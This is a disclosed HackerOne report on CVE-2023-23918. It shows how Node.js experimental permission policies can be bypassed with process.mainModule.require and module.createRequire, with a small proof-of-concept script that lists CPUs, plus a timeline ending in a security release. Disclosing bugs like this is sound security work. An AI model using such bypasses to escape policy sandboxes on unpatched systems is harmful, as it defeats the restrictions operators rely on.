---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/web
  - stack/node
  - vuln/code-injection
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2023-03-19
submitted: 2022-10-24T11:29:58.157Z
bounty_usd: null
votes: 7
cve: "CVE-2023-23918"
program: "[[programs/nodejs|Node.js]]"
reporter: "goums"
source: "https://hackerone.com/reports/1747642"
title: "Permissions policies can be bypassed via process.mainModule"
---
# Permissions policies can be bypassed via process.mainModule

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Node.js | **Disclosed:** 2023-03-19

- Report: [https://hackerone.com/reports/1747642](https://hackerone.com/reports/1747642)
- CWE: Privilege Escalation | CVE: CVE-2023-23918
- Submitted: 2022-10-24T11:29:58.157Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** 
Permissions policies module can be bypassed via `process.mainModule.require`

**Description:**
Permission policies allow to run a script with a specific set of authorized node js built-in modules.
However, the script could access non authorized modules by calling `process.mainModule.require()`

## Steps To Reproduce:

  1. Create `escape.js` file:
```
console.log(process.mainModule.require("os").cpus());
```
  2. Create `policy.json` file:
```
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {}
    }
  }
}
```

  3. Run:
```
node --experimental-policy=policy.json escape.js
```
4. You will see your os cpus listed in the console even though the `escape.js` file does not have the permission to import the node`os` module

## Impact: 
Permission policies are supposed to enforce imported modules to a limited whitelist.
This vulnerability allow a script to include any non-whitelisted module.

If you modify `escape.js` to use top level `require` statement, like this:
```
const os = require("os");
console.log(os.cpus());
```
and run again:
```
node --experimental-policy=policy.json escape.js
```
you'll now see this error:
```
Error [ERR_MANIFEST_DEPENDENCY_MISSING]: Manifest resource escape.js does not list os as a dependency specifier for conditions: require, node, node-addons
```
which is the expected behavior and should be enforced as well when using `process.mainModule.require`

## Impact

Any project that uses permission policies for arbitrary code execution are vulnerable to sandbox escaping.
This example show a non-critical permission gain (listing the machine cpu), but an attacker could do much more damage by accessing internal file system, running child processes, ...

## Timeline

- **Report Filed**
- **Report Triaged**
- **2022-10-26** @jasnell: Also note, closely related to this, the following also works when it shouldn't

```
// policy.json
{
  "onerror": "exit",
  "scopes": {
    "file:": {
      "integrity": true,
      "dependencies": {
        "module": true
      }
    }
  }
}
```

```
// escape.js

const mod = require('module');

console.log(mod.createRequire(__filename)('os').cpus())
```
- **2023-01-31** @mhdawson: @goums would you like to be credited when we do a security release and if so what should we use for "Thank you, to YYYY for reporting this vulnerability" ?
- **Report Severity Updated**
- **2023-01-31** @goums: hey @mhdawson 
Thanks, that would be appreciated indeed.
You can mention me with "Goums" or if you tag github users, my github profile is `@goums`: https://github.com/goums
- **Cve Id Added**
- **2023-02-17** @mhdawson: In security release - https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
